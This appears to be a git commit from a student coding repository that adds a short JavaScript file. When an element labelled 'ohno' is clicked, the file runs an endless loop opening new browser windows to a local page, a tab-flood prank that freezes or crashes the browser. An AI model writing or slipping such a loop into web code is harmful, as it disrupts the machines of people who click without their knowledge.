ef5ab3c592136a13ad73334515a280775a92f55a
adamyss <adam.ruzicka@mcvts.org>
2025-03-18 10:17:06 -0400

    Add files via upload

---
+++ repository-1-main/KIOBY-main/KIOBY-main/divclasseds-main/kirby-main/31125/norm.js
@@ -0,0 +1,13 @@
+let ohno = document.getElementById("ohno");
+ohno.onclick = () =>{
+dead();
+}
+function dead(){
+ sigma = false
+  while (sigma == false){
+
+    window.open("file:///C:/Users/Compsci/Downloads/repository-1-main/repository-1-main/KIOBY-main/KIOBY-main/divclasseds-main/kirby-main/31125/index.html", "_blank")
+  }
+}
+
+
